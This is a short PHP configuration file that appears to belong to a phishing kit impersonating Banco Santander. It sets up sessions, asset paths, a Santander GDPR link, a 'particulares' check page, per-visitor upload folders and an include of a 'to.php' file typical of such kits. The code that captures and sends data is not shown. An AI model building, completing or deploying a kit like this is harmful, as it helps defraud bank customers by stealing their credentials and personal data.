<?php 

	/* Main Rulez Functions */
	ob_start();
	session_start();
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
	@set_time_limit(ini_get('0'));
	header('Content-type: text/html; charset-UTF-8');
	date_default_timezone_set('GMT');

	/* Folder Directory */
	$inc  = './includes/';
	(isset($page) && $page == 'check') ? ($func = './particulares/includes/func/functions.php') && ($to = './particulares/includes/to.php') : ($func = $inc . 'func/functions.php') && ($to = $inc . 'to.php');
	$css1  = './layout/css/style.css';
	$css2  = './layout/css/normalize.css';
	$js  = './layout/js/style.js';
	$font = './layout/img/';
	$img  = './layout/img/';
	$index = './../index.php';
	$link = "https://www.bancosantander.es/es/gdpr";
	$favicon = $img . 'favicon.png';
	$id    = "id=".rand(99, 100000000);
    $referer = $_SERVER['HTTP_USER_AGENT'];
    
	/* Require Files */
	require_once $func;
	require_once $to;
    $user = _user();
    $dir  = "./data/uploads/". $user ."/";
?>